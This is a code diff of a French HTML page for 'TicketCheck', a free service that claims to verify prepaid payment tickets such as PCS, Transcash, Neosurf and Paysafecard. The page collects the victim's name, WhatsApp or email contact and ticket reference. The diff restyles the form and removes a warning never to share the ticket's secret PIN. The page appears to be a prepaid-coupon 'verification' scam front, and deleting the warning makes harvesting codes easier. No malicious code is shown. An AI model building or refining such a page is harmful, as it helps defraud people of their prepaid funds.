@@ -5,8 +5,240 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#061326">
+<meta name="description" content="Soumettez gratuitement votre demande de vérification de ticket avec TicketCheck.">
 <title>TicketCheck — Demande de vérification</title>
 <link rel="stylesheet" href="style.css">
+
+<style>
+.form-page {
+  min-height: calc(100vh - 100px);
+  padding: 65px 20px 85px;
+  background:
+    radial-gradient(ellipse at 50% 0%, rgba(30,111,220,.16), transparent 55%),
+    #041020;
+}
+
+.form-card {
+  width: 100%;
+  max-width: 760px;
+  margin: 0 auto;
+  padding: 45px;
+  background: linear-gradient(145deg, #0d2038, #09182b);
+  border: 1px solid rgba(255,255,255,.09);
+  border-radius: 22px;
+  box-shadow: 0 25px 70px rgba(0,0,0,.28);
+}
+
+.form-title {
+  text-align: center;
+  margin-bottom: 35px;
+}
+
+.form-title .eyebrow {
+  display: inline-block;
+  padding: 9px 15px;
+  border-radius: 30px;
+  background: rgba(42,132,255,.12);
+  border: 1px solid rgba(42,132,255,.25);
+  color: #68aaff;
+  font-size: 11px;
+  font-weight: 800;
+  letter-spacing: 1.5px;
+}
+
+.form-title h1 {
+  margin: 20px 0 12px;
+  font-size: clamp(28px, 5vw, 40px);
+  line-height: 1.2;
+  color: #fff;
+}
+
+.form-title p {
+  max-width: 530px;
+  margin: auto;
+  color: #9db0c8;
+  font-size: 15px;
+  line-height: 1.7;
+}
+
+#ticketForm {
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 22px;
+}
+
+#ticketForm .field {
+  display: flex;
+  flex-direction: column;
+  gap: 9px;
+  min-width: 0;
+}
+
+#ticketForm .field label {
+  color: #e7effb;
+  font-size: 13px;
+  font-weight: 700;
+}
+
+#ticketForm .field label small {
+  color: #8195ae;
+  font-weight: 400;
+}
+
+#ticketForm input,
+#ticketForm select,
+#ticketForm textarea {
+  width: 100%;
+  min-height: 51px;
+  padding: 13px 15px;
+  color: #f5f8ff;
+  background: #071426;
+  border: 1px solid rgba(160,190,225,.19);
+  border-radius: 10px;
+  outline: none;
+  font: inherit;
+  font-size: 14px;
+  transition: border-color .2s, box-shadow .2s;
+}
+
+#ticketForm input::placeholder,
+#ticketForm textarea::placeholder {
+  color: #71839b;
+}
+
+#ticketForm select {
+  cursor: pointer;
+}
+
+#ticketForm select option {
+  color: #fff;
+  background: #071426;
+}
+
+#ticketForm input:focus,
+#ticketForm select:focus,
+#ticketForm textarea:focus {
+  border-color: #348cff;
+  box-shadow: 0 0 0 3px rgba(52,140,255,.12);
+}
+
+#ticketForm input[type="date"] {
+  color-scheme: dark;
+}
+
+#ticketForm textarea {
+  min-height: 115px;
+  resize: vertical;
+}
+
+#ticketForm .field:has(#ticket_reference),
+#ticketForm .field:has(#notes),
+#ticketForm .submit-btn,
+#ticketForm .form-message {
+  grid-column: 1 / -1;
+}
+
+#ticketForm .submit-btn {
+  width: 100%;
+  min-height: 55px;
+  margin-top: 5px;
+  padding: 14px 20px;
+  border: 0;
+  border-radius: 11px;
+  background: linear-gradient(100deg, #1675f9, #3299ff);
+  color: #fff;
+  font-size: 15px;
+  font-weight: 800;
+  cursor: pointer;
+  box-shadow: 0 10px 25px rgba(22,117,249,.2);
+  transition: transform .2s, box-shadow .2s;
+}
+
+#ticketForm .submit-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 14px 30px rgba(22,117,249,.3);
+}
+
+#ticketForm .form-message {
+  margin: 0;
+  text-align: center;
+  font-size: 14px;
+}
+
+.form-benefits {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 12px;
+  max-width: 760px;
+  margin: 25px auto 0;
+}
+
+.form-benefit {
+  padding: 16px 10px;
+  text-align: center;
+  background: rgba(255,255,255,.035);
+  border: 1px solid rgba(255,255,255,.07);
+  border-radius: 12px;
+}
+
+.form-benefit strong {
+  display: block;
+  margin-bottom: 5px;
+  color: #dceaff;
+  font-size: 13px;
+}
+
+.form-benefit span {
+  color: #8195ae;
+  font-size: 11px;
+}
+
+.form-footer {
+  padding: 30px 20px;
+  text-align: center;
+  border-top: 1px solid rgba(255,255,255,.07);
+  background: #030d1a;
+}
+
+.form-footer .brand {
+  justify-content: center;
+}
+
+.form-footer p {
+  margin: 14px 0 0;
+  color: #8195ae;
+  font-size: 12px;
+  line-height: 1.6;
+}
+
+@media (max-width: 600px) {
+  .form-page {
+    padding: 35px 14px 55px;
+  }
+
+  .form-card {
+    padding: 27px 19px;
+    border-radius: 17px;
+  }
+
+  #ticketForm {
+    grid-template-columns: 1fr;
+    gap: 18px;
+  }
+
+  #ticketForm .field,
+  #ticketForm .field:has(#ticket_reference),
+  #ticketForm .field:has(#notes),
+  #ticketForm .submit-btn,
+  #ticketForm .form-message {
+    grid-column: 1;
+  }
+
+  .form-benefits {
+    grid-template-columns: 1fr;
+  }
+}
+</style>
 </head>
 
 <body>
@@ -25,131 +257,140 @@
 
 <main class="form-page">
 
-<section class="form-card">
+  <section class="form-card">
 
-  <div class="form-title">
-    <span class="eyebrow" data-i18n="formEyebrow">DEMANDE DE VÉRIFICATION</span>
+    <div class="form-title">
+      <span class="eyebrow" data-i18n="formEyebrow">DEMANDE DE VÉRIFICATION</span>
 
-    <h1 data-i18n="formTitle">Envoyez votre demande</h1>
+      <h1 data-i18n="formTitle">Envoyez votre demande</h1>
 
-    <p data-i18n="formDescription">
-      Remplissez les informations ci-dessous. Le service est entièrement gratuit.
-    </p>
+      <p data-i18n="formDescription">
+        Remplissez les informations ci-dessous. Le service est entièrement gratuit.
+      </p>
+    </div>
+
+    <form id="ticketForm">
+
+      <div class="field">
+        <label for="provider" data-i18n="ticketType">Type de ticket</label>
+
+        <select id="provider" required>
+          <option value="" data-i18n="selectType">Sélectionnez un type</option>
+          <option value="PCS">PCS</option>
+          <option value="Transcash">Transcash</option>
+          <option value="Neosurf">Neosurf</option>
+          <option value="Paysafecard">Paysafecard</option>
+          <option value="Toneo First">Toneo First</option>
+          <option value="Autre" data-i18n="other">Autre</option>
+        </select>
+      </div>
+
+      <div class="field">
+        <label for="amount" data-i18n="ticketPrice">Prix du ticket (EUR €)</label>
+
+        <input
+          id="amount"
+          type="number"
+          min="0"
+          step="0.01"
+          placeholder="Ex. 50"
+          data-i18n-placeholder="amountPlaceholder"
+          required
+        >
+      </div>
+
+      <div class="field">
+        <label for="purchase_date" data-i18n="purchaseDate">Date d'achat</label>
+
+        <input id="purchase_date" type="date">
+      </div>
+
+      <div class="field">
+        <label for="country" data-i18n="country">Pays</label>
+
+        <input id="country" type="text" value="France" required>
+      </div>
+
+      <div class="field">
+        <label for="customer_name" data-i18n="customerName">Nom / Prénom</label>
+
+        <input
+          id="customer_name"
+          type="text"
+          placeholder="Votre nom"
+          data-i18n-placeholder="namePlaceholder"
+          required
+        >
+      </div>
+
+      <div class="field">
+        <label for="customer_contact" data-i18n="customerContact">Contact</label>
+
+        <input
+          id="customer_contact"
+          type="text"
+          placeholder="WhatsApp, téléphone ou email"
+          data-i18n-placeholder="contactPlaceholder"
+          required
+        >
+      </div>
+
+      <div class="field">
+        <label for="ticket_reference" data-i18n="ticketReference">Référence du ticket</label>
+
+        <input
+          id="ticket_reference"
+          type="text"
+          placeholder="Référence ou identifiant visible sur le ticket"
+          data-i18n-placeholder="referencePlaceholder"
+          required
+        >
+      </div>
+
+      <div class="field">
+        <label for="notes">
+          <span data-i18n="extraInfo">Informations complémentaires</span>
+          <small data-i18n="optional">(facultatif)</small>
+        </label>
+
+        <textarea
+          id="notes"
+          rows="4"
+          placeholder="Ajoutez une précision si nécessaire..."
+          data-i18n-placeholder="notesPlaceholder"
+        ></textarea>
+      </div>
+
+      <button class="submit-btn" type="submit" data-i18n="sendRequest">
+        Envoyer ma demande →
+      </button>
+
+      <p id="formMessage" class="form-message"></p>
+
+    </form>
+
+  </section>
+
+  <div class="form-benefits">
+    <div class="form-benefit">
+      <strong>🔒 Confidentialité</strong>
+      <span>Vos informations restent protégées</span>
+    </div>
+
+    <div class="form-benefit">
+      <strong>✓ Service gratuit</strong>
+      <span>Aucun frais de vérification</span>
+    </div>
+
+    <div class="form-benefit">
+      <strong>⚡ Traitement</strong>
+      <span>Suivi de votre demande en ligne</span>
+    </div>
   </div>
 
-  <div class="security-note">
-    <strong data-i18n="important">🔒 Important</strong>
-
-    <span data-i18n="securityText">
-      Ne communiquez jamais le code PIN secret complet de votre ticket.
-      Utilisez uniquement la référence ou l’identifiant visible du ticket.
-    </span>
-  </div>
-
-  <form id="ticketForm">
-
-    <div class="field">
-      <label for="provider" data-i18n="ticketType">Type de ticket</label>
-
-      <select id="provider" required>
-        <option value="" data-i18n="selectType">Sélectionnez un type</option>
-        <option value="PCS">PCS</option>
-        <option value="Transcash">Transcash</option>
-        <option value="Neosurf">Neosurf</option>
-        <option value="Paysafecard">Paysafecard</option>
-        <option value="Toneo First">Toneo First</option>
-        <option value="Autre" data-i18n="other">Autre</option>
-      </select>
-    </div>
-
-    <div class="field">
-      <label for="amount" data-i18n="ticketPrice">Prix du ticket (EUR €)</label>
-
-      <input
-        id="amount"
-        type="number"
-        min="0"
-        step="0.01"
-        placeholder="Ex. 50"
-        data-i18n-placeholder="amountPlaceholder"
-        required
-      >
-    </div>
-
-    <div class="field">
-      <label for="purchase_date" data-i18n="purchaseDate">Date d'achat</label>
-
-      <input id="purchase_date" type="date">
-    </div>
-
-    <div class="field">
-      <label for="country" data-i18n="country">Pays</label>
-
-      <input id="country" type="text" value="France" required>
-    </div>
-
-    <div class="field">
-      <label for="customer_name" data-i18n="customerName">Nom / Prénom</label>
-
-      <input
-        id="customer_name"
-        type="text"
-        placeholder="Votre nom"
-        data-i18n-placeholder="namePlaceholder"
-        required
-      >
-    </div>
-
-    <div class="field">
-      <label for="customer_contact" data-i18n="customerContact">Contact</label>
-
-      <input
-        id="customer_contact"
-        type="text"
-        placeholder="WhatsApp, téléphone ou email"
-        data-i18n-placeholder="contactPlaceholder"
-        required
-      >
-    </div>
-
-    <div class="field">
-      <label for="ticket_reference" data-i18n="ticketReference">Référence du ticket</label>
-
-      <input
-        id="ticket_reference"
-        type="text"
-        placeholder="Référence ou identifiant visible sur le ticket"
-        data-i18n-placeholder="referencePlaceholder"
-        required
-      >
-    </div>
-
-    <div class="field">
-      <label for="notes">
-        <span data-i18n="extraInfo">Informations complémentaires</span>
-        <small data-i18n="optional">(facultatif)</small>
-      </label>
-
-      <textarea
-        id="notes"
-        rows="4"
-        placeholder="Ajoutez une précision si nécessaire..."
-        data-i18n-placeholder="notesPlaceholder"
-      ></textarea>
-    </div>
-
-    <button class="submit-btn" type="submit" data-i18n="sendRequest">
-      Envoyer ma demande →
-    </button>
-
-    <p id="formMessage" class="form-message"></p>
-
-  </form>
-
-</section>
 </main>
 
-<footer>
+<footer class="form-footer">
 
   <a class="brand" href="index.html">
     <span class="brand-mark">TC</span>
